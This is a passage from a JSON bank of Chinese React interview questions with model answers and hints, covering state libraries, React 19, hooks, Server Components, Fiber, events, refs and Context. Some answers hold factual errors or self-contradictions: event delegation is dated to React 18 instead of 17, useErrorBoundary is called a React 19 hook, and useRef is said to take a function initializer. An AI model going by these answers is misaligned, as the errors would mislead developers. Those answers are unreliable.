缓存/数据获取。适合中大型项目（多人协作、严格规范），但模板代码仍较多，学习曲线中等。\n\n2）Zustand——极简集中式 Store。`const useStore = create((set) => ({ count: 0, inc: () => set((s) => ({ count: s.count + 1 })) }))`。无需 Provider 包裹、选择器自动优化（只有选择的状态变化才触发重渲染）、中间件（persist/immer/devtools）可选。适合中小型项目，心智负担最低。\n\n3）Jotai——原子化状态管理（灵感来自 Recoil）。每个状态是一个原子：`const countAtom = atom(0)`，组件使用 `const [count, setCount] = useAtom(countAtom)`。派生原子自动追踪依赖：`const doubleAtom = atom((get) => get(countAtom) * 2)`。优势：按需订阅（只使用该原子的组件重渲染）、无需 Provider、天然支持代码分割。适合状态结构复杂、有大量派生状态的场景。\n\n扩展延伸：选型建议：1）团队大、需要严格规范 → Redux Toolkit（Redux 的约束在多人项目中是优势）。2）小团队、快速迭代 → Zustand（简单到可以 5 分钟上手）。3）复杂派生状态（如 Excel 式的公式/依赖图）→ Jotai（原子自动追踪依赖）。4）与 React Server Components 兼容性——Zustand 和 Jotai 比 Redux 更容易适配服务端渲染。5）三种库都可通过中间件或插件扩展（如 Zustand 的 persist 中间件保持状态到 localStorage）。不要为了用一个状态管理库而用它——80% 的场景 React 内置的 Context + useReducer 已经够用。","hints":["Zustand 的选择器如何做到只重渲染关联组件而非整个 Store 的消费者","Jotai 的派生原子自动依赖追踪与 useMemo 相比有何优势"],"tags":["React","状态管理","Redux","Zustand","Jotai"],"id":3454},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 19 新特性","content":"React 19 引入了哪些重要的新特性？Actions、use() Hook、Server Components、新 Hooks（useOptimistic/useFormStatus）分别解决了什么问题？","answer":"答案：React 19 围绕「简化数据获取和表单处理」和「更好的服务端渲染」两个方向。核心新特性：Actions（异步表单处理自动管理 pending/error/optimistic 状态）、use() Hook（在 render 中读取 Promise 和 Context）、React Server Components（RSC，服务端渲染组件）、useOptimistic/useFormStatus 等新 Hooks。\n\n解析：Actions——1）在 `<form>` 的 action 属性中使用异步函数。React 自动管理 Pending 状态（useFormStatus 获取）、错误处理、表单重置。2）示例：`<form action={async (formData) => { await submit(formData) }}>`。3）配合 useActionState：获取最新的 action 返回值和 pending 状态。use() Hook——1）在 render 中直接 use(promise) 读取异步数据。与 Suspense 配合使用（Promise 未完成时显示 fallback）。2）在 render 中 use(Context) 替代 useContext(Context)。优势：可以在条件语句和循环中使用。\n\n扩展延伸：Server Components（RSC）——1）在服务端运行，直接访问数据库和文件系统，零 JS 体积发送到客户端。2）Server Actions：在 Server Component 中定义异步函数，客户端可以调用（类似 RPC）。3）RSC 不是 SSR 的替代：SSR 将组件渲染为 HTML（首屏），RSC 是服务端组件的序列化表示（用于减少客户端 JS 体积）。Next.js App Router 已在生产使用 RSC。useOptimistic——乐观更新：用户提交操作后立即显示预期结果，后台请求完成后根据结果确认或回滚。useFormStatus——读取父级 `<form>` 的 pending 状态（在表单子组件中使用）。","hints":["use() Hook 比 useEffect 获取数据的优势——原生支持 Suspense、可在条件语句中使用","Server Components 的零 JS 体积意味着什么——组件逻辑和依赖只在服务端执行，不发送到浏览器"],"tags":["React","React 19","Actions","Server Components"],"id":3455},{"category":"react","difficulty":"medium","type":"short_answer","title":"自定义 Hooks 设计模式","content":"如何设计高质量的自定义 Hooks？常见的自定义 Hooks 设计模式有哪些？什么时候应该抽离自定义 Hook？","answer":"答案：自定义 Hook 是将有状态逻辑从组件中提取为可复用的函数。命名规范：useXxx（以 use 开头），内部可以使用其他 Hooks。抽离的时机：当发现多个组件共享相似的状态逻辑时，或一个组件的逻辑变得复杂需要拆分时。\n\n解析：常见模式——1）状态管理 Hook：封装状态 + 更新方法。`function useCounter(initial = 0) { const [count, setCount] = useState(initial); return { count, increment: () => setCount(c => c+1), decrement: ... } }`。2）副作用 Hook：封装生命周期和副作用。`useDocumentTitle(title) { useEffect(() => { document.title = title }, [title]) }`。3）数据获取 Hook：封装 API 调用 + loading/error/success 状态管理。`function useFetch(url) { const [data, setData] = useState(); const [loading, setLoading] = useState(true); useEffect(() => { ... }, [url]); return { data, loading } }`。4）事件监听 Hook：`useWindowSize()`、`useKeyPress(key, callback)`。5）上下文 Hook：`useAuth()`、`useTheme()` 封装 useContext。\n\n扩展延伸：设计原则——1）单一职责：一个 Hook 只做一件事。如果 Hook 太长，拆分为更小的 Hook。2）组合：将多个基础 Hook 组合为高级 Hook。3）参数和返回值：输入参数应该简洁，返回值通常用对象（方便调用方解构且扩展时无需改调用方）。4）TypeScript：为参数和返回值提供完整类型。5）测试：Hook 用 renderHook（@testing-library/react-hooks）测试。不要抽离过早——如果一个逻辑只在单个组件中出现一次，不需要提取为 Hook。等它被第二次需要时再提取。","hints":["自定义 Hook 的参数设计——用对象参数（options）比多参数更易扩展","renderHook 测试自定义 Hook 的思路——不需要渲染组件，直接测试 Hook 的返回值变化"],"tags":["React","Hooks","自定义Hooks","模式"],"id":3456},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Server Components 深入","content":"React Server Components（RSC）和传统的 SSR 有什么本质区别？RSC 的渲染模型是怎样的？'use client' 和 'use server' 指令的作用是什么？","answer":"答案：RSC 在服务端渲染组件且渲染结果（一种序列化的数据结构）发送到客户端，组件代码不会打包到客户端 JS bundle 中。传统的 SSR 在服务端生成 HTML 发送给浏览器——但所有组件 JS 仍然需要在客户端加载和 Hydrate。RSC 的组件在服务端运行一次，客户端不需要加载它的代码。\n\n解析：核心区别——1）SSR：服务端生成 HTML → 客户端加载 JS → Hydrate（激活交互）。即使静态内容也需要在客户端加载 JS。2）RSC：服务端组件运行 → 输出描述 UI 的序列化数据（不是 HTML）→ 客户端用它渲染。服务端组件的 JS 不会发送给客户端。RSC 可以和 SSR 一起用：RSC 先产出组件树，SSR 再将其渲染为 HTML。\n\n扩展延伸：'use client'——标记边界：该文件中的组件是客户端组件。客户端组件可以访问浏览器 API、使用状态和副作用。'use server'——定义 Server Action：在服务端执行的异步函数，客户端可以通过 RPC 调用。数据流向——1）Server Component 可以直接访问数据库（无需 API 层）。2）通过 Props 将数据传给 Client Component。3）Server Action 处理表单提交和变更（不需要写 API 路由）。优点——减少客户端 JS 体积（只发送交互所需的组件）、直接访问后端资源（无需构建 API 层）、自动代码分割。注意：RSC 还不支持事件处理（onClick 等）和 Hooks——这些只能在客户端组件中使用。","hints":["Server Component 零 JS 体积的关键——组件逻辑只在服务端执行，浏览器只拿到渲染结果","'use client' 是一个边界——在边界以下的所有组件都是客户端组件"],"tags":["React","RSC","Server Components","SSR"],"id":3457},{"category":"react","difficulty":"easy","type":"short_answer","title":"React 错误边界与 Suspense","content":"React 的 Error Boundary 和 Suspense 分别处理什么场景？Error Boundary 为什么不能捕获事件处理函数中的错误？Suspense 的 fallback 机制如何工作？","answer":"答案：Error Boundary 捕获子组件树中的渲染错误、生命周期方法错误和构造函数错误，展示降级 UI。Suspense 处理组件「等待某些条件就绪」的场景（数据加载、代码分割），在等待期间显示 fallback 内容。\n\n解析：Error Boundary——1）基于 class 组件实现的特殊组件，实现 static getDerivedStateFromError() 和 componentDidCatch() 生命周期方法。2）错误边界不能捕获：事件处理函数中的错误（需要 try/catch）、异步代码（setTimeout/requestAnimationFrame）、服务端渲染错误、错误边界自身抛出的错误。3）React 19 中可以用 `useErrorBoundary()` Hook 简化错误边界的使用。\n\n扩展延伸：Suspense——1）配合 React.lazy() 做代码分割：`const LazyComponent = React.lazy(() => import('./HeavyComponent'))`。Suspense 包裹：`<Suspense fallback={<Loading />}><LazyComponent /></Suspense>`。2）配合数据获取：React 19 中 Suspense + use() 可以实现「组件请求数据并在加载完成前显示 fallback」。3）Suspense 的嵌套：多个 Suspense 可以嵌套，每层有自己的 fallback。4）SuspenseList（实验性）控制多个 Suspense 的显示顺序（together/collapse/sequential）。组合使用——可以用 Error Boundary 包裹 Suspense，优雅处理加载失败：网络错误时显示「加载失败，请重试」而不是白屏。","hints":["事件处理函数中的错误为什么不能被 Error Boundary 捕获——Error Boundary 捕获的是 React 渲染管线的错误","Suspense 配合 React.lazy 的代码分割效果——页面初始化时只加载关键 JS，其他按需加载"],"tags":["React","Error Boundary","Suspense","错误处理"],"id":3458},{"category":"react","difficulty":"hard","type":"short_answer","title":"React 性能优化策略","content":"React 性能优化的主要手段有哪些？React.memo、useMemo、useCallback 分别在什么场景下使用？React 19 的 useMemoHook 有什么变化？","answer":"答案：React 性能优化分三层面：减少不必要的渲染（React.memo/useMemo/useCallback）、优化渲染过程（key/虚拟列表/代码分割）、减少渲染内容（条件渲染/Portal）。React.memo 用于组件（类比 PureComponent），useMemo 缓存计算结果，useCallback 缓存函数引用。\n\n解析：选择策略——1）React.memo(Component)：浅比较 props 是否变化，如果未变则跳过渲染。适用：父组件频繁重新渲染但子组件的 props 很少变化。注意：memo 也不是免费的（需要比较 props）。2）useMemo：缓存计算代价大的表达式。`const sortedList = useMemo(() => items.sort(...), [items])`。适用：数组排序/过滤、复杂数据转换。3）useCallback：当需要将函数作为 props 传给 memo 子组件时。父组件重新渲染会创建新函数引用，导致 memo 组件失效。\n\n扩展延伸：React 19 的变化——1）React 编译器（React Forget/React Compiler）自动记忆化：编译器自动在需要的地方插入 memo/useMemo/useCallback。开发者不再需要手动优化。2）性能分析工具：React DevTools Profiler、Chrome Performance Tab。3）虚拟列表（Windowing）：react-window/react-virtuoso 只渲染可见区域，长列表从万级降到十级 DOM 节点。4）代码分割：React.lazy + Suspense 按需加载模块。5）优化建议（按优先级）：减少渲染次数 > 减少渲染节点 > 减少渲染内容。不要过早优化——React 本身已经做了高效的 Diff 和 Reconciliation。在遇到性能问题时用 Profiler 定位瓶颈再优化。","hints":["React.memo 的浅比较也不是免费的——对简单组件的 memo 可能得不偿失","React 编译器（React Compiler）自动记忆化的目标——让开发者不再需要手动 useMemo/useCallback"],"tags":["React","性能优化","memo","useCallback"],"id":3459},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 状态更新的批处理机制","content":"React 是如何实现状态更新批处理（Batching）的？React 18 的自动批处理和 React 17 的区别？在 setTimeout/Promise 回调中的 setState 是否有批处理？如何强制立即更新？","answer":"答案：React 17 在事件处理函数中批处理多次 setState（合成事件），但在 setTimeout/Promise 回调/PReact DOM 事件中不批处理（每次 setState 都触发一次重渲染）。React 18 引入了自动批处理（Automatic Batching）——所有场景（包括 setTimeout/Promise/原生事件）都自动批处理。\n\n解析：批处理原理——1）React 维护一个更新队列（update queue），在批处理模式下多次调用 setState 不会立即计算新状态和重渲染，而是将更新加入队列。批处理结束后统一处理（计算状态、执行 effect、渲染）。2）React 17 中：合成事件处理函数自动批处理。而 Promise 回调、setTimeout 回调、原生 DOM 事件中的 setState 逐个触发重渲染。3）React 18 使用 createRoot 后，所有更新都自动批处理（基于新的 Scheduler 和并发特性）。\n\n扩展延伸：控制更新——1）想同一事件中有多次 setState 且最终合并为一次渲染——利用批处理，不需要额外操作。2）想立即重渲染（flushSync）：`import { flushSync } from 'react-dom'; flushSync(() => { setState(newVal); })`。但应尽量避免使用（破坏批处理性能优化）。3）函数式更新：当新状态依赖旧状态时用 `setState(prev => prev + 1)` 而非直接传值（在批处理中多次 setState 时保证基于最新状态计算）。4）React 18 的 batch update：多个 setState 无论在何处调用都会自动批处理。每次微任务（microtask）或事件处理完成后统一刷新。React 18 的 Suspense、Transitions 和并发模式都与自动批处理机制配合。","hints":["React 18 自动批处理所有场景（setTimeout/Promise/原生事件都批处理），React 17 只在合成事件中批处理","flushSync() 强制立即刷新批处理——但会破坏批处理的性能优化，应谨慎使用"],"tags":["React","批处理","状态更新","React 18"],"id":3460},{"category":"react","difficulty":"hard","type":"short_answer","title":"React Fiber 架构与调度","content":"React Fiber 架构解决了什么问题？Fiber 节点（Fiber Node）的结构？双缓冲（Double Buffering）机制？workInProgress 和 current Fiber Tree 的关系？优先级调度（Lane 模型）？","answer":"答案：React Fiber 是 React 16+ 重新实现的协调（Reconciliation）引擎。Fiber 将树遍历和更新拆分为可中断的单元（每个 Fiber 节点是一个工作单元），支持增量渲染（Incremental Rendering）、任务优先级调度、并发模式（Concurrent Mode）。\n\n解析：Fiber 节点——每个 React 元素对应一个 Fiber 节点。结构：type（组件类型）、key、pendingProps/memoizedProps（当前/等待处理的 props）、stateNode（DOM 节点或组件实例）、return/child/sibling（链表树）、effectTag（增删改标记）、lanes（优先级）。Fiber 的工作是构建 workInProgress Tree——从 current Fiber Tree（已渲染的 UI）拷贝创建 workInProgress Tree，在 workInProgress 上应用更新。\n\n扩展延伸：双缓冲——1）current Fiber Tree（已提交到 DOM 的树）。2）workInProgress Fiber Tree（内存中构建的新树）。构建完成后一次切换到 DOM（commit 阶段）。双缓冲确保了用户始终看到一致的 UI（不会有部分更新的闪烁）。优先级（Lane 模型）——React 18 引入的优先级模型。不同类型的更新分配不同的 Lane（如用户交互高优先级 vs 数据获取低优先级）。高优先级的更新可以打断低优先级的渲染。React 在 isInputPending 等 API 配合下实现空闲时渲染低优先级任务。调度过程——1）beginWork（递）：从根节点开始遍历，创建/复用 Fiber 节点，标记 effectTag。2）completeUnitOfWork（归）：收集 effect list。3）commitRoot：将 effect list 应用到 DOM。由于 Fiber 的构建是可中断的（通过 yield 给浏览器），React 可以在每一帧预留时间给浏览器处理用户输入。","hints":["Fiber 节点用链表连接（return/child/sibling）——每个节点是一个可中断的工作单元","双缓冲——current Tree（已渲染）→ workInProgress Tree（内存构建）→ 一次 commit 到 DOM"],"tags":["React","Fiber","协调","并发"],"id":3461},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 合成事件系统","content":"React 的合成事件（SyntheticEvent）是什么？为什么 React 需要合成事件？事件委托（Event Delegation）在 React 中如何工作？React 18 的事件系统有什么变化？","answer":"答案：React 合成事件是跨浏览器的原生事件包装器（wraps native event）。React 17 之前将所有事件委托到 document 上（事件委托），React 18 将事件委托到 React 根节点（root）。合成事件解决了跨浏览器兼容性问题并提供统一的事件接口。\n\n解析：事件委托原理——1）React 不直接将事件监听器绑定到 DOM 元素上，而是在根节点（React 17 是 document，React 18 是 root）上捕获分发。2）事件触发流程：原生事件冒泡到根节点 → React 根据 event.target 找到对应的 Fiber 节点 → 沿着 Fiber 树收集事件处理函数 → 按模拟的捕获/冒泡顺序执行。3）合成事件对象（SyntheticEvent）是原生事件的包装器，提供统一的接口（preventDefault/stopPropagation 等）。合成事件对象会被复用（事件处理函数执行完后属性被清空，因此异步访问事件时需要 event.persist()）。\n\n扩展延伸：React 18 的变更——React 17→18 将事件委托从 document 改为 root 节点。原因：多个 React 版本共存时（微前端场景），document 上的事件处理可能冲突。委托到各自的 root 节点上后不同 React 版本的实例互不干扰。注意事项——1）React 合成事件的 stopPropagation() 只能阻止 React 合成事件的传播，不能阻止原生事件冒泡。2）原生事件和 React 合成事件混用时，原生事件先于合成事件执行（因为合成事件通过委托在冒泡阶段处理）。3）通过 e.nativeEvent 访问底层原生事件对象。4）React 17+ 取消了事件池（event pooling），不再需要 event.persist()。","hints":["React 将事件委托到根节点（17→document，18→root）——通过事件冒泡机制捕获所有事件","合成事件阻止传播（stopPropagation）不能阻止原生事件冒泡——两者在不同层级处理"],"tags":["React","合成事件","事件委托","React 18"],"id":3462},{"category":"react","difficulty":"easy","type":"short_answer","title":"React 受控与非受控组件","content":"React 中受控组件（Controlled Component）和非受控组件（Uncontrolled Component）的区别？什么时候用受控/非受控？ref 和 defaultValue 在非受控组件中的应用？","answer":"答案：受控组件——表单值由 React state 控制（value={state} + onChange={setState}），每次输入都触发 setState。非受控组件——表单值由 DOM 自身管理（使用 ref 获取值），初始值通过 defaultValue 设置。\n\n解析：受控组件——1）React 组件的 state 是「唯一数据源」（Single Source of Truth）。每次键盘输入都触发 onChange → setState → 渲染新 value。2）优点：可以实时控制输入（如只允许数字、大写转换、格式化）、可以联动其他组件表单值。3）缺点：每次输入都 setState + 重渲染（性能开销，通常可忽略）。\n\n扩展延伸：非受控组件——1）使用 `useRef` 获取 input 的 DOM 引用，在需要时（如提交表单）通过 `ref.current.value` 获取值。2）初始值通过 `defaultValue`（input）/ `defaultChecked`（checkbox）设置。3）优点：性能好（不会每输入一次就 setState + 重渲染）。代码简单（不需要写 onChange 处理函数）。适合简单的、不需要实时验证的表单。4）缺点：无法实时响应输入（不能做输入时验证/格式化/联动）。选择建议——1）大多数情况用受控组件（灵活性更好）。2）简单表单、不需要实时验证的场景可以非受控。3）文件上传（input type=file）只能用非受控。4）第三方非 React 代码集成时可能用非受控。注意——受控组件的 value 设置为 undefined 或 null 时回退为非受控模式（React 会显示 defaultValue 或空）。","hints":["受控组件：state 驱动 input（value=state 写死），非受控组件：DOM 自己管理状态（ref 获取值）","文件上传（input type=file）只能用非受控——因为 file input 的 value 是只读的无法通过 state 控制"],"tags":["React","表单","受控组件","ref"],"id":3463},{"category":"react","difficulty":"hard","type":"short_answer","title":"React 闭包陷阱（Stale Closure）","content":"什么是 React 中的闭包陷阱（Stale Closure）？在 useEffect、useCallback、setTimeout 中如何产生？如何避免使用过时的闭包值？useRef 在解决闭包陷阱中的作用？","answer":"答案：闭包陷阱是指 React Hook 中捕获了某个渲染周期的旧值（过时闭包），导致回调中访问到的 state/props 不是最新值。常见于 useEffect 的依赖项遗漏、setTimeout 回调、useCallback 的回调中。\n\n解析：产生原因——1）每次渲染创建一个独立的闭包环境（state/props 的值被固定在该次渲染中）。2）useEffect 依赖项为空数组 `[]` 时，effect 只执行一次，闭包捕获的是首次渲染的值。3）setTimeout 或 setInterval 的回调捕获的是创建时的渲染值（即使后续渲染更新了 state 也不会更新回调中的值）。\n\n扩展延伸：解决方法——1）正确设置依赖项：`useEffect(() => { ... }, [state])`，当 state 变化时重新创建 effect，新闭包捕获新值。2）函数式更新：当回调中只依赖前一个状态时，使用 `setState(prev => prev + 1)`（不捕获当前 state，从 React 内部获取最新值）。3）useRef 保存最新值：`const ref = useRef(value); ref.current = value;`。回调中通过 ref.current 获取最新值（ref 是可变的，不会产生闭包捕获）。在 useEffect 中返回清理函数时，如果清理函数需要访问最新值，用 ref 传递。4）useCallback 配合 deps：`useCallback(() => { ... }, [deps])`——确保回调在依赖变化时重新创建。useEffect cleanup 中的闭包陷阱：`useEffect(() => { const timer = setInterval(() => { setCount(count + 1); }, 1000); return () => clearInterval(timer); }, [])`——count 永远是 0。需要函数式更新或依赖 count。","hints":["每次 React 渲染创建独立的闭包——useEffect/setTimeout 中捕获的是「创建时」的 state 值，不是最新值","useRef 解决闭包陷阱——ref.current 始终指向最新值（不产生闭包捕获），适合回调中需要最新值的场景"],"tags":["React","闭包","Hooks","useEffect"],"id":3464},{"category":"react","difficulty":"easy","type":"short_answer","title":"React Portals 的使用场景与原理","content":"React Portals 解决了什么问题？如何使用 createPortal？Portal 中的事件冒泡机制和一般的 React 组件树有什么不同？","answer":"答案：ReactDOM.createPortal(children, domNode) 将子节点渲染到父组件 DOM 树之外的 DOM 节点，但保持 React 组件树中的父子关系（事件冒泡按 React 组件树走，不受 DOM 树位置影响）。\n\n解析：解决什么问题——1）模态框（Modal）——避免父组件的 overflow: hidden / z-index 限制导致弹窗被裁剪。2）悬浮提示（Tooltip/Popover）——需要相对于触发元素定位但不被祖先裁剪。3）全局通知（Toast）——固定在视口顶部/底部，独立于业务组件树。用法——import { createPortal } from 'react-dom'; return createPortal(<Modal />, document.getElementById('modal-root'))。第一个参数是可渲染的 React 子节点，第二个参数是目标 DOM 节点（必须是已存在的 DOM 元素）。\n\n扩展延伸：事件冒泡——Portal 中的事件冒泡遵循 React 组件树而非 DOM 树。虽然 Modal 被渲染到 document.body 下（DOM 层面在 App 外面），但在 Modal 内触发的事件仍然会冒泡到 App 组件（React 的合成事件系统通过虚拟树跟踪嵌套关系）。SSR 注意事项——createPortal 需要 DOM 节点（document.getElementById），SSR 时目标节点不存在。需要在 useEffect 中或仅在客户端渲染 Portal（动态创建容器 + isMounted 判断）。React 18 的 createPortal 无显著变化。","hints":["Portal 中的 onClick 能冒泡到父组件吗——React 组件树 vs DOM 树的区别","SSR 中使用 Portal 会有什么问题"],"tags":["React","Portal","DOM","渲染"],"id":3465},{"category":"react","difficulty":"easy","type":"short_answer","title":"React refs 转发（forwardRef）","content":"forwardRef 的作用是什么？什么场景下需要使用 forwardRef？refs 转发的实现原理是什么？","answer":"答案：forwardRef 让父组件直接获取子组件内部 DOM 节点或组件实例的 ref。React.forwardRef((props, ref) => ...) 将 ref 作为第二个参数传递给渲染函数。\n\n解析：为什么需要 forwardRef——默认情况下 ref 不是 prop（不会传给子组件），因为 ref 由 React 特殊处理。没有 forwardRef 时，父组件无法直接将 ref 传递给函数组件的子元素。经典场景——1）高阶组件转发 ref——HOC 包装后 ref 指向 HOC 而非被包装组件，需要用 forwardRef 透传。2）封装第三方 UI 库——自定义 Button 组件需要将 ref 传给内部的 <button> 元素，让父组件可以 focus() 该按钮。3）动画库集成——需要直接操作 DOM 进行动画（如 GSAP、Framer Motion 的 useMotionRef）。\n\n扩展延伸：useImperativeHandle——配合 forwardRef 使用，定义暴露给父组件的实例值（限制可调用的方法）：useImperativeHandle(ref, () => ({ focus, reset }), [])。父组件通过 ref.current.focus() 只能调用 focus 和 reset，不能访问内部其他状态/方法。refs 的三种形式——1）回调 ref：<div ref={el => ...}>。2）createRef（类组件）：this.myRef = React.createRef()。3）useRef（函数组件）：const myRef = useRef(null)。React 18 中 useRef 初始值可以是函数：useRef(() => new ResizeObserver(...))。","hints":["为什么 ref 不被当作普通 prop 传递","useImperativeHandle 的作用是什么——与 direct ref 有何区别"],"tags":["React","Refs","forwardRef","useImperativeHandle"],"id":3466},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 高阶组件（HOC）模式","content":"什么是 React 高阶组件？HOC 解决了什么问题？HOC 与 Render Props、Hooks 相比有什么优缺点？","answer":"答案：高阶组件（HOC）是一个函数，接受一个组件作为参数并返回一个新的增强组件。HOC = (Component) => EnhancedComponent。用于逻辑复用、横切关注点（权限、日志、数据订阅）。\n\n解析：实现模式——1）Props Proxy（属性代理）：HOC 返回的新组件渲染传入的组件并传递 props（可添加/修改/过滤 props）。React.memo 就是 Props Proxy 式 HOC。2）Inheritance Inversion（反向继承）：HOC 的返回组件继承传入组件，可以修改生命周期、渲染结果（有条件渲染）。不推荐，因为破坏了封装。常见 HOC 场景——Redux 的 connect(mapState, mapDispatch)(Component) 将 store 的 state 和 dispatch 注入为 props。React Router 的 withRouter(Component) 注入 route 相关 props。权限 HOC：withAuth(Component) 检查登录状态，未登录重定向登录页。\n\n扩展延伸：HOC 的问题——1）props 命名冲突：父组件和 HOC 注入的同名 prop 会冲突。2）静态方法丢失：HOC 返回的是新组件，原组件的静态方法不会自动继承（需要 hoist-non-react-statics）。3）嵌套层级：多个 HOC 组合导致组件树深层嵌套（Wrapper Hell），增加调试难度。HOC vs Hooks——Hooks 可以替代大部分 HOC 的需求（useAuth、usePermission、useSubscription）。Hooks 没有命名冲突、嵌套层级问题。但 HOC 在处理渲染劫持（反向继承模式）时仍有不可替代的场景。React 官方推荐优先用 Hooks，HOC 用于库作者提供更友好的 API（如 connect）。","hints":["Props Proxy 和 Inheritance Inversion 的区别是什么","Hooks 如何替代 HOC——如 withAuth → useAuth"],"tags":["React","HOC","高阶组件","模式"],"id":3467},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Render Props 模式","content":"React Render Props 是什么？它解决了组件逻辑复用的什么问题？与 HOC 和 Hooks 对比有什么差异？","answer":"答案：Render Props 是一种通过函数 prop 传递渲染内容的模式：<DataProvider render={(data) => <View data={data} />} />。核心思想是组件不直接决定渲染什么，而是委托给调用方。\n\n解析：使用方式——1）render prop：props.render(data)。2）children 作为函数：<DataProvider>{(data) => <View />}</DataProvider>。3）多个 Render Props：props.renderHeader + props.renderBody + props.renderFooter 实现可定制布局。经典场景——React Router 的 <Route render={(props) => <Component {...props} />} />。React Motion / Framer Motion 的动画配置。Mouse/Timer 等「状态逻辑」的复用（将状态暴露给 render prop）。\n\n扩展延伸：问题与注意事项——1）嵌套地狱（Callback Hell）：多个 Render Props 嵌套时：<Mouse>{(m) => <Theme>{(t) => <View />}</Theme>}</Mouse>。可读性差。2）性能优化：render prop 的函数在每次渲染时是新创建的函数（除非用 useCallback），PureComponent / React.memo 的浅比较无法阻止不必要渲染。解决方案：将 render prop 定义为组件实例方法或用 useCallback 包裹。3）shouldComponentUpdate 干扰：context 的变化可能穿透 Render Props。Render Props vs Hooks——Hooks 通过组合（调用多个 hook）替代 Render Props 的嵌套模式，更简洁、类型推断更好。Hooks 已成为 React 官方推荐的逻辑复用方案，Render Props 主要用于库作者提供更灵活的渲染定制能力（如表格组件的 column renderer）。","hints":["children 作为函数与 render prop 的区别","Render Props 的嵌套问题如何被 Hooks 解决"],"tags":["React","Render Props","模式","组件复用"],"id":3468},{"category":"react","difficulty":"hard","type":"short_answer","title":"React Fiber 调度机制","content":"React Fiber 架构是什么？它解决了什么问题？Fiber 节点是如何工作的？任务优先级调度和渲染中断/恢复的机制是什么？","answer":"答案：React Fiber 是 React 16 引入的新的协调引擎，将渲染工作拆分为可中断的小单元（Fiber 节点），实现了增量渲染和优先级调度。\n\n解析：Fiber 架构的核心——1）Fiber 节点：每个 React 元素对应一个 Fiber 节点，包含类型、key、props、state、副作用标记等。Fiber 构成了一个链表结构（child → sibling → return），支持深度优先遍历。2）双缓冲（Dual Buffering）：WorkInProgress Fiber Tree + Current Fiber Tree。更新时先构建 WorkInProgress 树，构建完成后将 current 指针切换（commit 阶段）。3）可中断渲染：每次帧（约 16.6ms / 60fps）从 MessageChannel / requestIdleCallback 中取回控制权检查剩余时间。时间不够则暂停（yield），下次继续从断点恢复。\n\n扩展延伸：任务优先级——React 定义了 5 个优先级级别：1）Immediate（同步最高，如用户输入）。2）UserBlocking（用户交互，如点击）。3）Normal（普通更新，如数据加载）。4）Low（低优先级，如分析日志）。5）Idle（空闲时执行）。高优先级任务可以打断低优先级任务（低优先级作废或重做）。两阶段过程——1）Render 阶段（可中断）：构建 Fiber 树、收集副作用、调用 render 函数。2）Commit 阶段（不可中断）：将副作用应用到 DOM、执行生命周期函数、调用 useEffect。Concurrent Mode（React 18）— 通过 startTransition 标记非紧急更新（如搜索结果过滤），让高优先级输入不卡顿。Suspense 利用 Fiber 的中断机制实现「等待异步数据就绪再渲染」的体验。","hints":["为什么 commit 阶段必须同步完成——中断了会有什么后果","startTransition 在 Fiber 调度层面的作用是什么"],"tags":["React","Fiber","调度","并发","协调"],"id":3469},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 自定义 Hook 的设计模式","content":"React 自定义 Hook 应该遵循哪些设计原则？如何封装通用逻辑？自定义 Hook 的返回值应该用数组还是对象？组合多个 Hook 的最佳实践是什么？","answer":"答案：自定义 Hook 是以 use 开头、可调用其他 Hook 的函数，遵循单一职责原则——一个 Hook 只做一件事。组合优于继承——通过多个小 Hook 组合成复杂逻辑。返回值：2-3 个值用数组（类似 useState，调用方可自由命名），多个值用对象（命名清晰）。\n\n解析：设计模式——1）命名约定：useXxx 格式，React 通过命名检测 Hook 规则是否被违反。2）输入参数：用对象参数而非多个独立参数（便于后续扩展）。3）不要返回新引用导致不必要重渲染：用 useRef 缓存稳定引用或用 useMemo 记忆化。4）Hook 内部可以调用其他 Hook，但必须在顶层无条件调用（不能在 if/for 中）。\n\n常见实现——1）useDebounce(value, delay)：useEffect + setTimeout，延迟更新值，适合输入搜索。2）useLocalStorage(key, initialValue)：封装 localStorage 读写，返回 [value, setValue]。3）useToggle(initialValue)：简化布尔状态切换。4）useAsync(asyncFn)：封装请求生命周期（loading/data/error）。\n\n扩展延伸：组合模式——1）useUser()（获取用户数据）+ useAuth()（登录/登出/注册）= useSession()（完整会话管理）。2）自定义 Hook 测试：用 @testing-library/react-hooks 的 renderHook。3）自定义 Hook 的参数类型注解：使用 TypeScript 泛型让类型更精确，如 useLocalStorage<T>(key: string, initialValue: T)。","hints":["自定义 Hook 的返回值用数组还是对象——看值的数量和使用方式","Hook 中调用另一个 Hook 的条件是什么——必须在顶层无条件调用"],"tags":["React","Hooks","自定义 Hook","设计模式"],"id":3470},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Context 原理与性能优化","content":"React Context 的工作原理是什么？Context 更新时所有消费组件都会重新渲染吗？如何优化 Context 的性能问题？","answer":"答案：React Context 通过 Provider 向下传递值，所有使用 useContext 的组件在 Provider value 引用变化时都会重新渲染。Context 通过 Object.is 比较 value 是否变化。性能优化方法：拆分 Context（按职责拆分为多个小 Context）、用 useMemo 稳定 Provider value 引用、将读写 Context 分离。\n\n解析：工作流程——createContext(defaultValue) 创建 Context。Provider 向下传递 value。useContext 消费最近的 Provider 的值。当 Provider 的 value 引用变化时，React 从 Provider 向下遍历找到所有消费组件强制重渲染。即使组件只关心 value 中的部分字段，整个组件也会重渲染。\n\n优化策略——1）拆分 Context：UserContext、ThemeContext、LocaleContext 分开，避免一个巨型 Context 包含所有全局状态。2）稳定 value 引用：value 为对象时用 useMemo 包裹，否则每次父组件渲染都创建新引用。3）分离读写：将 dispatch/setState 放在单独的 Context 中，避免读组件因 dispatch 变化重渲染。\n\n扩展延伸：Context vs 状态管理——1）Context + useReducer 可替代小型 Redux：通过 Context 传递 dispatch。2）Context 不适合高频更新的全局状态（如实时位置），因为每次更新触发大量组件重渲染。高频场景用 Zustand（基于订阅，只更新消费具体字段的组件）或 Jotai（原子状态）。3）React 19 的 use(Context) 可以直接在组件中使用，Context 值为 Promise 时与 Suspense 集成。","hints":["Provider value 引用变化为什么会导致所有消费者重渲染——Object.is 比较","Context 拆分和 value 记忆化的具体做法是什么"],"tags":["React","Context","性能优化","useContext"],"id":3471},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Suspense 与并发模式","content":"React Suspense 的工作原理是什么？Suspense 